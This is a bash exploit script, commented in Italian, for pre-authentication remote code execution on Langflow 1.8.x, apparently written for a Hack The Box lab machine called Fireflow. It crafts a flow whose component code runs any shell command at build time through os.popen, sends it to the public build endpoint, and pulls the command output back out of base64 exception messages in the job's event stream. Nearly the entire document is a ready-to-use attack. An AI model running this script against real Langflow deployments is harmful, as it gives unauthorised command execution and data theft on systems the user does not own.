#!/bin/bash
# langflow_rce.sh — RCE pre-auth su Langflow 1.8.x (pattern CVE-2026-33017 / HTB Fireflow)
# Il class body del componente viene eseguito a build time da create_class;
# l'output del comando torna base64 nel message dell'eccezione, negli eventi SSE del job.
# Uso: ./langflow_rce.sh 'command' [target_base] [flow_id]
set -u
CMD="${1:?usage: langflow_rce.sh 'command' [target_base] [flow_id]}"
B="${2:-https://flow.fireflow.htb}"
F="${3:-7d84d636-af65-42e4-ac38-26e867052c25}"
K="${KOPT:--k}"
CID="client_id=$(python3 -c 'import uuid; print(uuid.uuid4())')"
RESOLVE_ARG=""
[ -n "${RESOLVE:-}" ] && RESOLVE_ARG="--resolve $RESOLVE"
python3 -c '
import json, sys, base64
cmd = base64.b64encode(sys.argv[1].encode()).decode()
code = ("from langflow.custom import Component\n"
        "class TmpComp(Component):\n"
        "    import os, base64\n"
        "    _c = base64.b64decode(\"%s\").decode()\n"
        "    _r = os.popen(_c).read()\n"
        "    raise Exception(\"EXFIL \" + base64.b64encode(_r.encode()).decode())\n"
        "    display_name = \"TmpComp\"\n") % cmd
node = {"id": "Component-1", "type": "genericNode", "position": {"x": 0, "y": 0},
        "data": {"id": "Component-1", "type": "Component",
                 "node": {"template": {"_type": "Component",
                          "code": {"type": "code", "name": "code", "value": code,
                                   "required": True, "show": True, "advanced": False, "dynamic": False}},
                          "description": "poc", "display_name": "TmpComp",
                          "base_classes": ["Any"], "outputs": []}}}
print(json.dumps({"data": {"nodes": [node], "edges": []}}))
' "$CMD" > /tmp/.ff_payload.json
JOB=$(curl -s $K -m 20 $RESOLVE_ARG -X POST \
  -H 'Content-Type: application/json' -b "$CID" -d @/tmp/.ff_payload.json "$B/api/v1/build_public_tmp/$F/flow" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin).get("job_id",""))')
[ -z "$JOB" ] && { echo "no job_id returned"; exit 1; }
sleep 3
curl -s $K -N -m 10 $RESOLVE_ARG -b "$CID" "$B/api/v1/build_public_tmp/$JOB/events" | python3 -c '
import sys, re, base64
buf = sys.stdin.read()
m = re.findall(r"EXFIL ([A-Za-z0-9+/=]+)", buf)
if m:
    print(base64.b64decode(m[-1]).decode(errors="replace"))
else:
    print("[no EXFIL in events]"); print(buf[:1200])
'
rm -f /tmp/.ff_payload.json
